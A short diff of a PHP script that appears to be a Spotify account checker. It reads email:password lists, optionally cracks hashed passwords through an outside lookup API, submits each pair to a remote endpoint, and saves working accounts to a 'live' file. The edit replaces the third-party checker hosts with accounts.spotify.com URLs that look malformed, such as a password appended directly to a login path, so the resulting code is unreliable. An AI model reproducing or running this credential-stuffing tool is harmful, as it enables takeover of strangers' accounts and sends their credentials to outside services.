@@ -36,11 +36,11 @@ for($a=0;$a<count($data);$a++){
         $email = $data1[0];
         $pass = $data1[1];
 	if($argv[2]=="--md5"){
-		$get = @file_get_contents("https://lea.kz/api/hash/$pass");
+		$get = @file_get_contents("https://accounts.spotify.com/id/login$pass");
 		$json = json_decode($get,true);
 		$pass = $json['password'];
 	}
-	$cek = @file_get_contents("https://upgan-rexxxz.c9users.io/api.php?email=$email&pass=$pass&apikey=$apikey");
+	$cek = @file_get_contents("https://accounts.spotify.com/api/login/?email=$email&pass=$pass&apikey=$apikey");
 	if (strpos($cek,"Spotify")) {
  if(!in_array($cek,explode("\n",@file_get_contents("spotify-live.txt")))){
   $h=fopen("spotify-live.txt","a");
